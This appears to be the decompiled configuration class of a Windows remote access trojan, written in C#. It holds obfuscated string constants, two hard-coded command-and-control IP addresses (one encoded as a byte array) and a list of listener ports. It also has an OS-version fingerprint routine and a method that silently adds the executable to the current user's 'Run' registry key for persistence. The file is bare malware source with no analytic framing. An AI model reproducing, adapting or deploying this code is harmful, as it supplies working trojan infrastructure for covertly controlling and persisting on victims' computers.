using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace aphmasnvs;

internal static class COUNF
{
	public static string aphmasnvspc_id = "sidra|aphmasnvs".Split(new char[1] { '|' })[0];

	public static string aphmasnvsremvUser = "ihwsinkr|aphmasnvs".Split(new char[1] { '|' })[0];

	public static string aphmasnvsfilesLogs = "ithshsldh".Split(new char[1] { '|' })[0];

	public static string aphmasnvsdefaultP = "201.2.210.220|aphmasnvs".Split(new char[1] { '|' })[0];

	public static string aphmasnvsmainApp = "aphmasnvs|aphmasnvs".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 3564, 12565, 16556, 18555, 8443 };

	public static int aphmasnvsport;

	public static byte[] aphmasnvsvpsips = new byte[15]
	{
		49, 48, 52, 46, 50, 50, 55, 46, 50, 52,
		52, 46, 49, 51, 56
	};

	public static string filePath = Application.get_ExecutablePath();

	public static byte[] getuByteuArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string aphmasnvsOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!aphmasnvs".Split(new char[1] { '!' })[0];
		}
	}

	public static void aphmasnvsset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|aphmasnvs".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			object value = registryKey.GetValue(aphmasnvspc_id + app);
			if (value == null || value.ToString() != path)
			{
				registryKey.SetValue(aphmasnvspc_id + app, path);
			}
		}
		catch
		{
		}
	}

	public static string aphmasnvsget_mpath()
	{
		return Path.GetDirectoryName(filePath) + "\\";
	}
}
